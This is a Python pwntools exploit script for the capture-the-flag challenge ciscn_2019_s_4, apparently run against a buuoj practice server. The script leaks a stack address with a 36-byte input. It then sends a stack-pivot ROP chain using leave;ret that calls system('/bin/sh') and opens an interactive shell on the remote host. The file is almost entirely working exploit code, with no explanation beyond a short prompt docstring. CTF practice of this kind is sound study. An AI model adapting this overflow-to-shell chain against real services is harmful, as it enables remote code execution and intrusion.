from pwn import *


def ciscn_2019_s_4(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_s_4'):
    print('ciscn_2019_s_4 start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 26121)
    target_elf = ELF(file_name)

    read_plt = p32(target_elf.plt['read'])
    system_plt = p32(target_elf.plt['system'])

    leave_ret_gadget = p32(0x080485FD)
    pop_ret_gadget = p32(0x080483bd)  # pop ebx ; ret
    pop3_ret_gadget = p32(0x08048699)  # pop esi ; pop edi ; pop ebp ; ret

    # gdb.attach(target)
    target.sendlineafter("Welcome, my friend. What's your name?", b'a' * 36)
    print(target.recvline())
    print(target.recvline())
    print(target.recv(3))
    stack_addr = u32(target.recv(4)) - 60
    print("stack: %x" % stack_addr)
    bin_sh_addr = p32(stack_addr + 16)
    print("bin_sh_addr: %x" % u32(bin_sh_addr))

    payload = system_plt + pop_ret_gadget + bin_sh_addr
    payload += b'/bin/sh\x00'
    payload += b'a' * (40 - len(payload))
    # ebp
    payload += p32(stack_addr)
    # reload esp
    payload += leave_ret_gadget

    target.sendline(payload)
    target.interactive()
    print('ciscn_2019_s_4 end')


if __name__ == '__main__':
    '''
        tips：
            Hello,
            Welcome, my friend.
            What's your name?
            Welcome, my friend. What's your name?
    '''
    ciscn_2019_s_4()
